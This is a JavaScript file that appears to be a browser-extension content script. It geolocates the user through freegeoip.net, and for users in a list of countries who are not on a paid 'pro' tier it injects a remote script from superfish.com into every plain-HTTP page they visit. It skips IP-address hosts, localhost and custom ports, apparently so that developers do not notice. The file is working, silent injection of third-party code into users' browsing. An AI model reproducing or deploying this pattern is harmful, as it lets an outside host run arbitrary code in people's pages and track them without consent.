(function() {
  var addScript, checkCountry, countries, loadJSON;

  if (location.protocol !== "http:") {
    return;
  }

  if (location.port !== "") {
    return;
  }

  if (location.hostname.match(/^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/)) {
    return;
  }

  if (!(location.hostname.split(".").length > 1)) {
    return;
  }

  if (location.hostname.indexOf("localhost", location.hostname.length - "localhost".length) !== -1) {
    return;
  }

  loadJSON = function(path, success) {
    var xhr;
    xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
      if (xhr.readyState !== 4) {
        return;
      }
      if (xhr.status !== 200) {
        return;
      }
      if (typeof success !== "function") {
        return;
      }
      return success(JSON.parse(xhr.responseText));
    };
    xhr.open("GET", path, true);
    return xhr.send();
  };

  countries = ["US", "CA", "GB", "FR", "DE", "IT", "ES", "AT", "BE", "CH", "DK", "IE", "NL", "NO", "SE", "AR", "BR", "MX", "CL", "CO", "AU", "NZ"];

  chrome.storage.local.get(["country", "pro", "superfish_disabled"], function(data) {
    var age, now;
    if (data && data.pro === true) {
      return;
    }
    if (data && data.superfish_disabled === true) {
      return;
    }
    now = parseInt((new Date).getTime() / 1000);
    if (data && data.country && data.country.time) {
      age = now - data.country.time;
    }
    if ((typeof data.country === "undefined") || (age && age > 86400)) {
      return loadJSON("https://freegeoip.net/json/", function(response) {
        if (!(response && response.country_code)) {
          return;
        }
        data = {
          country: {
            code: String(response.country_code),
            time: now
          }
        };
        chrome.storage.local.set(data);
        return checkCountry(data.country);
      });
    } else {
      return checkCountry(data.country);
    }
  });

  addScript = function(url) {
    var tag;
    tag = document.createElement("script");
    tag.type = "text/javascript";
    tag.src = url;
    return document.getElementsByTagName("head")[0].appendChild(tag);
  };

  checkCountry = function(country) {
    if (countries.indexOf(country.code) === -1) {
      return;
    }
    return addScript("http://www.superfish.com/ws/sf_main.jsp?dlsource=irusvef&CTID=sntp");
  };

}).call(this);
